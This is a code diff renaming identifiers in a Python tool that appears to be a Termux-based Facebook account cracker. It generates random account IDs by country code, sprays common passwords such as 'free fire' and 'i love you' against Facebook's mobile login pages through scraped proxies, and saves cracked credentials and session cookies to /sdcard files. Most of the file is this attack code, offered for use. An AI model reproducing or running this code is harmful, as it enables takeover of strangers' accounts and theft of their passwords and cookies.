@@ -1,6 +1,6 @@
-#created by anox-x aka syco-x chaudhary
-#open source by anox-x
-#github= anox-x-XD
+#created by anoX aka syco-x chaudhary
+#open source by anoX
+#github= anoX-XD
 #BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
 #JAI NEPAL
 # fb id https://www.facebook.com/asyco-x.chaudhary69
@@ -60,7 +60,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python anox-x.py')
+    os.system('python anoX.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -72,7 +72,7 @@ from time import sleep as waktu
 ##useragent
 ugen2=[]
 ugen=[]
-anox-x_xd==[]
+anoX_xd = []
 
 try:
     prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
@@ -1134,7 +1134,7 @@ def uaku2():
 		for ub in ua : 
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/anox-x-XD/XD/blob/main/ua2.txt').text
+		a=requests.get('https://github.com/anoX-XD/XD/blob/main/ua2.txt').text
 		ua=open('.ua2.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -1143,7 +1143,7 @@ def uaku2():
 		
 os.system("clear")
 print("FOLLOW US ON GITHUB")
-os.system("xdg-open https://github.com/anox-x-XD")
+os.system("xdg-open https://github.com/anoX-XD")
 #app  check 
 
 
@@ -1159,7 +1159,7 @@ logo ="""
 [+]==============================================
 [+] CREATED BY   :  syco-xxROHIT
 [+] FB GROUP     :  TERMUX TEAM INP COMMAND 
-[+] ON GITHUB    :  anox-x-XD
+[+] ON GITHUB    :  anoX-XD
 [+] TOOL STATUS  :  RANDOM
 [+] TOOL VIRSION :  0.2
 [+]=============================================="""
@@ -1203,25 +1203,25 @@ def follow(ses,coki):
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
     
     		
-def anox-x():
+def anoX():
     os.system("clear")
     print(logo)
     
     print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
     print(49*'=')
     syco-x = input("✓CHOOSE>")
-    if syco-x =='1':anox-x1()
-    elif syco-x =='2':anox-x2()
-    elif syco-x =='3':anox-x3()
-    elif syco-x =='4':anox-x4()
-    elif syco-x =='5':anox-x5()
-    elif syco-x =='6':anox-x6()
+    if syco-x =='1':anoX1()
+    elif syco-x =='2':anoX2()
+    elif syco-x =='3':anoX3()
+    elif syco-x =='4':anoX4()
+    elif syco-x =='5':anoX5()
+    elif syco-x =='6':anoX6()
     elif syco-x =='7':os.system("xdg-open https://www.facebook.com/asyco-x.chaudhary69")
     else:
         print("SELECT CORRECT OPTION")
-        anox-x()
+        anoX()
     
-def anox-x1():
+def anoX1():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1239,23 +1239,23 @@ def anox-x1():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1265,26 +1265,26 @@ def anox-x1():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
-			if anox-xfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':yaari.submit(d,uid,pwx,tl)
+			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] CRACKING COMPLETED ')
 	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	input("DO YOU WANT TO GO BSCK MENU ")
-	anox-x()
+	anoX()
 	print(47*"-")
 	
 	
@@ -1292,7 +1292,7 @@ def anox-x1():
 
 
 
-def anox-x2():
+def anoX2():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1310,23 +1310,23 @@ def anox-x2():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1336,29 +1336,29 @@ def anox-x2():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if anox-xfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':yaari.submit(d,uid,pwx,tl)
+			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	print(47*"-")
 
 
-def anox-x3():
+def anoX3():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1376,23 +1376,23 @@ def anox-x3():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1402,34 +1402,34 @@ def anox-x3():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
-			if anox-xfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':yaari.submit(d,uid,pwx,tl)
+			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	print(47*"-")
 			
 	print(47*"-")
 	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	print(47*"-")
 
 
-def anox-x4():
+def anoX4():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1447,23 +1447,23 @@ def anox-x4():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1473,31 +1473,31 @@ def anox-x4():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
-			if anox-xfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':yaari.submit(d,uid,pwx,tl)
+			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	print(47*"-")
 
 
 
 
-def anox-x5():
+def anoX5():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1523,23 +1523,23 @@ def anox-x5():
 	print(49*'=')
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1550,26 +1550,26 @@ def anox-x5():
 		tl = str(len(user))
 		print(f"[+] CODE CHOOSED : "+code)
 		print(f"[+] TOTAL IDZ : "+tl+" ")
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for love in user:
 			pwx = [love[1:]]
 			uid = code+love
 			for Eman in HamiiID:
 				pwx.append(Eman)
-			if anox-xfire =='1':manshera.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':manshera.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':manshera.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':manshera.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':manshera.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':manshera.submit(d,uid,pwx,tl)
+			if anoXfire =='1':manshera.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':manshera.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':manshera.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':manshera.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':manshera.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':manshera.submit(d,uid,pwx,tl)
 			else:
 			    manshera.submit(p,uid,pwx,tl)
 			
 
 
 
-def anox-x6():
+def anoX6():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1587,23 +1587,23 @@ def anox-x6():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	anox-xfire = input("[+] [CHOOSE] :- ")
+	anoXfire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
 	print("[+]==============================================")
-	anox-xlovesyou = input("[+] [CHOOSE] :- ")
-	if anox-xlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anox-x_xd.append('y')
+	anoXlovesyou = input("[+] [CHOOSE] :- ")
+	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		anoX_xd.append('y')
 	else:
-		anox-x_xd.append('n')
+		anoX_xd.append('n')
 	print("[+]==============================================")
 	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
 	print("[+]==============================================")
-	anox-xtop = input("[+] [CHOOSE] :- ")
-	if anox-xtop in ['y','Y','Yes','YES','1']:
+	anoXtop = input("[+] [CHOOSE] :- ")
+	if anoXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1613,25 +1613,25 @@ def anox-x6():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anox-xfire}')
+		print(f'[+] METHOD CHOOSED : M{anoXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if anox-xfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anox-xfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anox-xfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anox-xfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anox-xfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anox-xfire =='6':yaari.submit(d,uid,pwx,tl)
+			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anox-x-OK.txt,anox-x-CP.txt')
+	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
 	print(47*"-")
 
 
@@ -1684,34 +1684,34 @@ def mbasic(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M1-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M1-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1767,34 +1767,34 @@ def p(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M2-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M2-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1848,34 +1848,34 @@ def x(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M3-anox-x] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M3-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1929,34 +1929,34 @@ def mobile(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anox-x-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anox-x_xd:
+				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
+				if 'y' in anoX_xd:
 					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anox-x-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anox-x-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					cps.append(cid)
 					break
 				else:
-					open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anox-x-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
